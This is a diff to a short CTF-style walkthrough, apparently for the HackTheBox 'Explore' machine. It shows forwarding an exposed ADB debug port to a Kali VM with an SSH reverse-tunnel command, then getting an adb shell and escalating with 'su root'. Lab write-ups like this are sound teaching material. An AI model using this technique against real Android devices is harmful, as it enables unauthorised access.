@@ -5,5 +5,12 @@ Discovered local port 5555 on which adb in debug mode was running.
 ## Port forwarding port 5555 to kali VM via ssh tunnelling 
 First of all SSH service was enabled on kali VM (explalined on [link](https://linuxize.com/post/how-to-setup-ssh-tunneling/). Then port 5555 on Explore machine was forwarded via ssh tunnelling to kali VM via command `ssh -R 5555:127.0.0.1:5555 -N -f kali@10.10.14.98 -p 2222`. 
 ![[Pasted image 20210919190913.png]]
-## Now connec
+## Now getting shell as 'shell' user via connecting to forwarded port 5555 on kali vm by using adb
+Now getting shell as 'shell' user via connecting to forwarded port 5555 on kali vm by using ad.
+![[Pasted image 20210919191241.png]]
+## Now escalating to root via `su root`
+![[Pasted image 20210919191339.png]]
+
+
+
 
